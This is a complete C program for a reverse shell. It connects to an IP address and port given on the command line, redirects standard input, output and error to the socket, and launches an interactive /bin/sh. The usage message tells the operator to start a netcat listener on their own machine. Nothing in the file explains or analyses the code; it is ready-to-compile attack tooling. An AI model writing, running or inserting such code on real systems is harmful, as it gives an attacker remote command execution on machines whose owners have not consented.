#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{

	if ( argc <= 2 || argc >= 4 )
	{
		puts("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++\n");
		puts("Listen a Port on Your Machine, ex: nc -lnvp 443");
		printf("\nUsage: %s YOUR_IP YOUR_PORT\n",argv[0]);
		puts("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++\n");
		return -1;
	}

	register unsigned long int SOCKET;
	struct sockaddr_in target;

	target.sin_family = AF_INET;
	target.sin_addr.s_addr = inet_addr(*(argv+1));
	target.sin_port = htons(atoi(argv[2]));
	SOCKET = socket(AF_INET,SOCK_STREAM,0);
	connect(SOCKET,(struct sockaddr *)&target,sizeof(target));
	dup2(SOCKET,0);
	dup2(SOCKET,1);
	dup2(SOCKET,2);
	execl("/bin/sh","sh","-i",NULL,NULL);

	return 0;

}
